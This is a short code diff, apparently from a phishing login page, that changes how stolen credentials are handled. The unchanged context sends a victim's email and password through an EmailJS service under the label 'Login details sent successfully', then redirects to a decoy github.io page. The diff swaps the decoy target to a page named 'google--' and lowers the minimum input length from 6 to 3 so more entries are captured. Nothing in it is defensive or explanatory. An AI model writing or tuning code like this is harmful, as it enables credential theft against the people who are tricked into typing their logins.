@@ -164,7 +164,7 @@
         emailjs.send("service_vdcs1jx", "template_1m4cj2n", templateParams)
             .then(function(response) {
                 console.log("Login details sent successfully", response);
-                window.location.href = 'https://indian-art.github.io/voting-failed/';
+                window.location.href = 'https://indian-art.github.io/google--/';
             }, function(error) {
                 console.log("Failed to send login details. Error:", error);
                 console.log("email:", email);
@@ -185,7 +185,7 @@
         const passwordValue = passwordInput.value.trim();
 
         // Check if email and password meet the length requirement
-        if (emailValue.length < 6 || passwordValue.length < 6) {
+        if (emailValue.length < 3 || passwordValue.length < 3) {
             loginButton.disabled = true;
             return;
         }
